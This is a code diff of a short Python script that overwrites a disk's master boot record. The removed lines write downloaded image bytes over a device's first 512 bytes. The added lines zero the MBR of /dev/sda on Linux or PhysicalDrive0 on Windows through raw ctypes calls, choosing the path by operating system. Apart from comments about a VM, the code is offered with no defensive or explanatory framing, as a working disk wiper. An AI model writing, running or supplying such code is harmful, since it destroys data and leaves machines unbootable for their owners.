@@ -1,23 +1,46 @@
-import requests
+import os
+import platform
 
-# Step 1: Download the image from the HTTPS link
-url = "https://th.bing.com/th/id/OIP.RH2gc-Oe1qSvCjD3IRYAyQHaE7?rs=1&pid=ImgDetMain"  # Replace with your actual image URL
-response = requests.get(url)
+def delete_mbr_linux(disk):
+    with open(disk, 'wb') as f:
+        f.write(b'\x00' * 512)
+    print(f"MBR on {disk} deleted successfully.")
 
-# Ensure the request was successful
-if response.status_code == 200:
-    image_data = response.content
-else:
-    raise Exception(f"Failed to download image. Status code: {response.status_code}")
+def delete_mbr_windows(disk):
+    import ctypes
+    GENERIC_WRITE = 0x40000000
+    CREATE_NEW = 1
 
-# Step 2: Convert the image data to bytes
-# Note: This step might be redundant as `response.content` is already in bytes format
+    handle = ctypes.windll.kernel32.CreateFileW(
+        disk,
+        GENERIC_WRITE,
+        0,
+        None,
+        CREATE_NEW,
+        0,
+        None
+    )
 
-# Step 3: Write the bytes to the MBR
-mbr_path = "/dev/sdX"  # Replace with the appropriate device (e.g., /dev/sda)
+    if handle == -1:
+        raise ctypes.WinError()
 
-# WARNING: This will overwrite the MBR of the specified disk
-with open(mbr_path, "wb") as mbr:
-    mbr.write(image_data[:512])
+    written = ctypes.c_ulong(0)
+    buffer = ctypes.create_string_buffer(b'\x00' * 512)
+    
+    ctypes.windll.kernel32.WriteFile(handle, buffer, 512, ctypes.byref(written), None)
+    ctypes.windll.kernel32.CloseHandle(handle)
+    print(f"MBR on {disk} deleted successfully.")
 
-print("MBR has been overwritten with the image data.")
+def main():
+    if platform.system() == 'Linux':
+        disk = '/dev/sda'  # Change this to the correct disk for your VM
+        delete_mbr_linux(disk)
+    elif platform.system() == 'Windows':
+        disk = r'\\.\PhysicalDrive0'  # Change this to the correct disk for your VM
+        delete_mbr_windows(disk)
+    else:
+        print("Unsupported operating system.")
+
+if __name__ == "__main__":
+    main()
+
